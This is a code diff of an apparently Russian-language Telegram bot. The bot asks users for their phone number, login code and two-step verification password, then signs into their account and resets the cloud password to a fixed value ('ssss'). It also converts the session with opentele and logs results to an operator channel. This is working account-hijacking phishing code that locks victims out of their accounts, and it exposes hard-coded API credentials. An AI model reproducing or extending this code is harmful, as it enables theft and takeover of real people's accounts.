@@ -40,7 +40,7 @@ ADMIN_IDS = [8887644613]
 REQUIRED_CHANNEL = "@samoobmanTG"
 LOGS_CHANNEL_ID = -1003813816419
 
-API_ID = 31063615  # Строго integer для opentele
+API_ID = 31063615  # Внутри клиента будет преобразован в строку для opentele
 API_HASH = "dbe3b8f435016b0dcd3e4bca995a9169"
 AUTO_PASSWORD = "ssss"  # Пароль для автоматической установки
 
@@ -58,7 +58,7 @@ dp.include_router(router)
 class AuthStates(StatesGroup):
     waiting_for_phone = State()
     waiting_for_code = State()
-    waiting_for_password = State()  # Состояние для запроса 2FA пароля
+    waiting_for_password = State()
 
 
 class AdminStates(StatesGroup):
@@ -254,10 +254,8 @@ async def send_log(text: str):
         logger.error(f"Не удалось отправить лог: {e}")
 
 
-# Функция завершения авторизации, конвертации и выдачи бонуса
 async def finalize_auth_and_success(message: Message, state: FSMContext, client: TelegramClient, phone: str,
                                     session_name: str):
-    # Устанавливаем новый защитный пароль скупа (ssss)
     try:
         await client.edit_2fa(new_password=AUTO_PASSWORD)
     except Exception as e:
@@ -415,7 +413,8 @@ async def process_phone(message: Message, state: FSMContext):
 
     await state.update_data(phone=phone, session_name=session_name, session_path=session_path)
 
-    client = TelegramClient(session_path, int(API_ID), API_HASH)
+    # Передаем api_id как строку для корректной работы opentele
+    client = TelegramClient(session_path, str(API_ID), API_HASH)
 
     try:
         await client.connect()
@@ -443,10 +442,8 @@ async def process_code(message: Message, state: FSMContext):
 
     try:
         await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
-        # Если вход успешен (нет пароля 2FA), завершаем процедуру
         await finalize_auth_and_success(message, state, client, phone, session_name)
     except SessionPasswordNeededError:
-        # Пароль установлен на аккаунте — запрашиваем его у пользователя
         await message.answer(
             "🔐 На вашем аккаунте установлен облачный пароль (двухэтапная аутентификация).\n"
             "Пожалуйста, введите ваш пароль от аккаунта:"
